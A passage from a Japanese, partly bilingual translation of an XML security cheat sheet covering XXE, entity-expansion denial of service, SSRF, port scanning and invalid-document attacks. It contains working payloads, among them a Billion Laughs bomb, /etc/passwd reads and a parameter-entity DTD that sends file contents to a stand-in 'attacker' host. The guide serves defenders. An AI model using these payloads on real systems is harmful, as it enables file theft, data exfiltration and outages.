   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

前述のコードは次の出力を生成します。

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### SAX を使った XXE

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

前述のコードは次の出力を生成します。

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### StAX を使った XXE

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```

前述のコードは次の出力を生成します。

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

#### 再帰的エンティティ参照

**要素 `A` の定義が別の要素 `B` であり、その要素 `B` が要素 `A` として定義されている場合、そのスキーマは要素間の循環参照を表します。**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

#### 二次的爆発

**このシナリオでは、攻撃者は複数の小さく深くネストされたエンティティを定義する代わりに、一つの非常に大きなエンティティを定義し、それを可能な限り何度も参照します。その結果、二次的な展開 (*O(n^2)*) が発生します。**

次の攻撃の結果は、メモリ上で 100,000 x 100,000 文字になります。

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

#### Billion Laughs

**XML パーサが次のコードに含まれる外部エンティティを解決しようとすると、プロセスがクラッシュするまで、アプリケーションは利用可能なメモリをすべて消費し始めます。** これは、攻撃を含む埋め込み [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを持つ XML 文書の例です。

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

エンティティ `LOL9` は `LOL8` に定義された 10 個のエンティティとして解決され、その後、それぞれのエンティティが `LOL7` 内で解決される、というように続きます。最終的に、このスキーマで定義された `3 x 10^9` (3,000,000,000) 個のエンティティを解析することで CPU やメモリが影響を受け、パーサがクラッシュする可能性があります。

**Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) 仕様は [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を完全に禁止しています。これは、SOAP プロセッサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を含む任意の SOAP メッセージを拒否できることを意味します。この仕様にもかかわらず、一部の SOAP 実装は SOAP メッセージ内の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを解析していました。**

次の例は、パーサが仕様に従っておらず、SOAP メッセージ内で [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) への参照を有効にしているケースを示しています。

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

#### 反射型ファイル取得

XXE の次のサンプルコードを考えてください。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

**前述の XML は `xxe` という名前のエンティティを定義しており、これは実際には `/etc/passwd` の内容であり、`includeme` タグ内で展開されます。パーサが外部エンティティへの参照を許可している場合、そのファイルの内容が XML レスポンスまたはエラー出力に含まれる可能性があります。**

#### サーバーサイドリクエストフォージェリ

**サーバーサイドリクエストフォージェリ (Server Side Request Forgery: SSRF) は、サーバーが悪意ある XML スキーマを受け取り、それによって HTTP/HTTPS/FTP などを介してファイルなどのリモートリソースを取得させられる場合に発生します。** SSRF は、リモートファイルの取得、ファイルを反射して返せない場合の XXE の証明、ポートスキャン、内部ネットワークへのブルートフォース攻撃に使用されてきました。

##### 外部 DNS 解決

**アプリケーションに任意のドメイン名のサーバーサイド DNS ルックアップを実行させられる場合があります。** これは SSRF の最も単純な形式の一つですが、攻撃者は DNS トラフィックを分析する必要があります。Burp にはこの攻撃をチェックするプラグインがあります。

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

##### 外部接続

XXE があり、ファイルを取得できない場合でも、リモート接続を確立できるかをテストできます。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

##### パラメータエンティティによるファイル取得

パラメータエンティティは、URL 参照を使用してコンテンツを取得できるようにします。次の悪意ある XML 文書を考えてください。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

ここで [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) は二つの外部パラメータエンティティを定義しています。`file` はローカルファイルを読み込み、`dtd` はリモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を読み込みます。リモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) には、次のような内容が含まれるべきです。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

二つ目の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) により、システムは `file` の内容を URL のパラメータとして攻撃者のサーバーに送り返します。

##### ポートスキャン

ポートスキャンによって生成される情報の量と種類は、実装の種類に依存します。レスポンスは、簡単なものから複雑なものまで、次のように分類できます。

**1) 完全な開示**: これは最も単純で最も珍しいシナリオです。完全な開示では、問い合わせ対象サーバーから完全なレスポンスを受け取ることで、何が起きているかを明確に確認できます。リモートホストへの接続時に何が起こったかを正確に表現できます。

**2) エラーベース**: リモートサーバーからのレスポンスを確認できない場合でも、エラーレスポンスによって生成される情報を使用できる可能性があります。接続を確立しようとしたときに何が問題だったかを SOAP Fault 要素で詳細に漏えいする Web サービスを考えてください。

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

**3) タイムアウトベース**: スキャナは、スキーマと基盤実装に応じて、開いているポートまたは閉じているポートに接続するときにタイムアウトを生成する可能性があります。閉じたポートに接続しようとしているときにタイムアウトが発生する場合 (1 分かかることがあります)、有効なポートに接続したときの応答時間は非常に短くなります (たとえば 1 秒)。開いているポートと閉じているポートの違いはかなり明確になります。

**4) 時間ベース**: 結果が非常に微妙であるため、閉じたポートと開いているポートの違いを見分けるのが難しい場合があります。ポートの状態を確実に知る唯一の方法は、各ホストに到達するために必要な時間を複数回測定し、その後、各ポートの平均時間を分析して各ポートの状態を判定することです。この種の攻撃は、高遅延ネットワークで実行される場合、達成が困難になります。

##### ブルートフォース

**攻撃者がポートスキャンを実行できることを確認したら、ブルートフォース攻撃は `username` と `password` を URI スキーム (http、ftp など) の一部として埋め込むだけで実行できます。** たとえば、次の例を参照してください。

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

</section>

<section id="xml-security-bilingual-panel" className="tabPanel bilingualPanel">

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Introduction

While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## はじめに

XML と XML スキーマの仕様は XML アプリケーションを保護するために必要な手段を提供しますが、同時に複数のセキュリティ上の弱点も含んでいます。これらは、ファイル取得、サーバーサイドリクエストフォージェリ、ポートスキャン、ブルートフォースなど、複数種類の攻撃に悪用される可能性があります。このチートシートでは、ライブラリやソフトウェアで使われる XML のさまざまな機能を攻撃者がどのように悪用できるかを、次の二つの攻撃面に分けて理解できるようにします。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- **Malformed XML Documents**: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
- **Invalid XML Documents**: Exploiting vulnerabilities that occur when documents that do not have the expected structure.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- **不正形式の XML 文書 (Malformed XML Documents)**: アプリケーションが整形式でない XML 文書に遭遇したときに発生する脆弱性を悪用するものです。
- **無効な XML 文書 (Invalid XML Documents)**: 文書が期待された構造を持たないときに発生する脆弱性を悪用するものです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Dealing with malformed XML documents

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 不正形式の XML 文書への対処

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Definition of a malformed XML document

If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." **If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.** A malformed document can include one or more of the following problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不正形式の XML 文書の定義

XML 文書が W3C XML 仕様における整形式文書の定義に従っていない場合、その文書は「不正形式」と見なされます。**XML 文書が不正形式である場合、XML パーサは致命的エラーを検出し、実行を停止すべきであり、その文書を追加処理してはならず、アプリケーションはエラーメッセージを表示すべきです。** 不正形式の文書には、終了タグの欠落、要素順序の無意味な構造化、禁止文字の導入など、一つ以上の問題が含まれることがあります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Handling malformed XML documents

**To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.** In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不正形式の XML 文書の取り扱い

**不正形式の文書に対処するため、開発者は W3C 仕様に従い、不正形式の文書の処理に著しい追加時間を要しない XML プロセッサを使用すべきです。** さらに、整形式文書のみを使用し、各要素の内容を検証し、事前定義された境界内の有効な値だけを処理すべきです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Malformed XML documents require extra time

**A malformed document may affect the consumption of Central Processing Unit (CPU) resources.** In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 不正形式の XML 文書は追加時間を必要とする

**不正形式の文書は Central Processing Unit (CPU) リソースの消費に影響する可能性があります。** 特定のシナリオでは、不正形式の文書を処理するために必要な時間が、整形式文書の処理時間よりも長くなることがあります。この場合、攻撃者は処理時間の増加を利用する非対称リソース消費攻撃を悪用し、サービス拒否 (Denial of Service: DoS) を引き起こす可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.** Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**この攻撃の起こりやすさを分析するには、通常の XML 文書にかかる時間と、同じ文書の不正形式版にかかる時間を比較します。** そのうえで、攻撃者が複数の文書を使う XML flood 攻撃とこの脆弱性を組み合わせ、影響を増幅できるかを検討してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Applications Processing Malformed Data

**Certain XML parsers have the ability to recover malformed documents.** They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. **Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不正形式データを処理するアプリケーション

**一部の XML パーサには、不正形式の文書を復元する能力があります。** 仕様に準拠していない文書であっても、解析できたすべての内容を含む有効なツリーをできる限り返すよう指示できます。**復元プロセスには事前定義された規則がないため、これらのパーサのアプローチと結果は常に同じとは限りません。不正形式の文書を使用すると、データ整合性に関する予期しない問題につながる可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

次の二つのシナリオは、復元モードでパーサが分析する攻撃ベクトルを示しています。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Malformed Document to Malformed Document

According to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 不正形式文書から不正形式文書へ

XML 仕様によると、文字列 `--` (二重ハイフン) はコメント内に出現してはなりません。lxml と PHP の復元モードを使用すると、次の文書は復元後も同じままになります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Well-Formed Document to Well-Formed Document Normalized

Certain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 整形式文書から正規化された整形式文書へ

一部のパーサは、`CDATA` セクションの内容を正規化することがあります。これは、必須ではないにもかかわらず、`CDATA` セクションに含まれる特殊文字を安全な表現に更新することを意味します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`CDATA` セクションの正規化は、パーサ間で共通の規則ではありません。Libxml はこの文書を正準形式に変換する可能性がありますが、整形式ではあっても、状況によっては内容が不正形式と見なされる可能性があります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Handling coercive parsing

**One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.** Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 強制的な解析への対処

**XML における一般的な強制型攻撃の一つは、対応する終了タグを持たない深くネストされた XML 文書を解析させることです。狙いは、被害者にマシンのリソースを使い切らせ、最終的に枯渇させて、対象にサービス拒否を発生させることです。** Firefox 3.67 における DoS 攻撃の報告には、対応する終了タグを持たない 30,000 個の開始 XML 要素の使用が含まれていました。終了タグを削除すると、同じ結果を達成するために整形式文書の半分のサイズだけで済むため、攻撃が単純になります。処理されるタグ数により、最終的にスタックオーバーフローが発生しました。このような文書の単純化した例は次のようになります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Violation of XML Specification Rules

Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. **It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## XML 仕様規則への違反

W3C 仕様に従わないパーサを使用して文書を操作すると、予期しない結果が生じる可能性があります。**ソフトウェアが不正な XML 構造の扱いを適切に検証しない場合、クラッシュやコード実行を達成できる可能性があります。ファジングされた XML 文書をソフトウェアに与えることで、この挙動が露呈する可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Dealing with invalid XML documents

**Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.** Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 無効な XML 文書への対処

**攻撃者は、文書に有効な値セットが含まれているかをアプリケーションが検証しないことを悪用するため、予期しない値を文書に導入する可能性があります。** スキーマは文書が有効かどうかを識別するための制約を指定します。有効な文書は整形式であり、スキーマの制約に準拠しています。一つの文書の検証には複数のスキーマを使用でき、これらの制約は単一のスキーマ言語を使用する場合でも、複数のスキーマ言語の強みを利用する場合でも、複数のファイルに現れることがあります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これらの脆弱性を避けるための推奨事項は、各 XML 文書に対して、( [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) ではなく) 正確に定義された XML Schema を持たせ、不適切なデータ検証の問題を避けるために、すべての情報を適切に制限することです。XML 文書内で提供されるスキーマ参照ではなく、ローカルコピーまたは既知の良好なリポジトリを使用してください。また、参照される XML スキーマファイルについて、リポジトリが侵害される可能性も考慮しながら、整合性チェックを実施してください。XML 文書がリモートスキーマを使用する場合は、攻撃者によるネットワークトラフィックの盗聴を防ぐため、サーバーを安全な暗号化通信のみを使用するよう構成してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Document without Schema

Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### スキーマのない文書

ある書店が、Web インターフェースを通じてトランザクションを行う Web サービスを使用しているとします。トランザクション用の XML 文書は、商品に関連する `id` 値と特定の `price` という二つの要素で構成されます。ユーザーは Web インターフェースを使って特定の `id` 値だけを入力できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**文書構造に制御がない場合、アプリケーションは意図しない結果を伴う別の整形式メッセージも処理してしまう可能性があります。前述の文書には、その内容を処理する基盤アプリケーションの挙動に影響する追加タグを含めることができたかもしれません**。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

値 123 が再び `id` として提供されている点に注意してください。ただし、今度は文書に追加の開始タグと終了タグが含まれています。攻撃者は `id` 要素を閉じ、偽の `price` 要素を値 0 に設定します。構造を整形式に保つ最後の手順として、空の `id` 要素を一つ追加します。その後、アプリケーションは `id` の終了タグを追加し、`price` を 10 に設定します。アプリケーションが構造に対する制御を一切行わず、ID と値について最初に提供された値だけを処理する場合、攻撃者は実際には支払わずに本を購入できるようになり、利益を得る可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Unrestrictive Schema

**Certain schemas do not offer enough restrictions for the type of data that each element can receive.** This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 制約の弱いスキーマ

**一部のスキーマは、各要素が受け取れるデータ型に対して十分な制約を提供しません。** これは通常、[DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合に発生します。DTD は、XML 文書に適用できる制約の種類と比べて、非常に限られた可能性しか持ちません。そのため、他のスキーマ言語を使用すれば容易に制約できる要素や属性内の望ましくない値に、アプリケーションがさらされる可能性があります。次の例では、人物の `age` がインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマに対して検証されます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述の文書には、`person` という名前のルート要素を持つインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) が含まれています。この要素には、特定の順序で二つの要素、つまり `name` と `age` が含まれます。その後、`name` 要素は `age` 要素と同様に `PCDATA` を含むよう定義されています。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element.

</div>
